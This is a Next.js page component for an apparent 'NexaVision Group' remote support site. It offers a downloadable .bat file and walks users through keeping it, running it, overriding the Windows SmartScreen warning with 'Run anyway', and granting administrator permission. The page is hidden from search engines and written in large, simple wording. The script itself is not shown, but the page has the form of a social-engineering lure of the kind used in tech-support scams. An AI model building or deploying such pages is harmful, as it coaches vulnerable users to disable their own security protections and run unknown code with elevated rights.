import type { Metadata } from "next";

export const metadata: Metadata = {
  title: "Remote Support",
  description: "Download the NexaVision Group remote support connector.",
  robots: { index: false, follow: false },
};

export default function SupportPage() {
  return (
    <main
      style={{
        minHeight: "100dvh",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        textAlign: "center",
        padding: "32px 20px",
        background: "#0b1020",
        color: "#f4f6fb",
        fontFamily:
          "system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif",
      }}
    >
      <div style={{ maxWidth: 520, width: "100%" }}>
        <p
          style={{
            fontSize: 15,
            letterSpacing: 2,
            textTransform: "uppercase",
            opacity: 0.7,
            margin: 0,
          }}
        >
          NexaVision Group
        </p>
        <h1 style={{ fontSize: 34, lineHeight: 1.15, margin: "12px 0 28px" }}>
          Remote Support
        </h1>

        <a
          href="/support/NexaVision-Support.bat"
          download
          style={{
            display: "block",
            background: "#4f7cff",
            color: "#fff",
            fontSize: 26,
            fontWeight: 700,
            textDecoration: "none",
            padding: "26px 24px",
            borderRadius: 18,
            boxShadow: "0 10px 30px rgba(79,124,255,0.45)",
          }}
        >
          Download Support Tool
        </a>

        <ol
          style={{
            textAlign: "left",
            margin: "34px auto 0",
            padding: "0 0 0 26px",
            fontSize: 20,
            lineHeight: 1.7,
            maxWidth: 440,
          }}
        >
          <li>Tap the blue button.</li>
          <li>
            If the browser asks, choose <b>Keep</b>.
          </li>
          <li>
            Open the file <b>NexaVision-Support</b> (double-click it).
          </li>
          <li>
            If a blue box says &ldquo;Windows protected your PC,&rdquo; tap{" "}
            <b>More info</b>, then <b>Run anyway</b>.
          </li>
          <li>
            When it asks permission, click <b>Yes</b>.
          </li>
          <li>A black window opens. Leave it until it says DONE.</li>
        </ol>

        <p style={{ fontSize: 15, opacity: 0.6, marginTop: 30 }}>
          Trouble? Call NexaVision Group and we&rsquo;ll walk you through it.
        </p>
      </div>
    </main>
  );
}
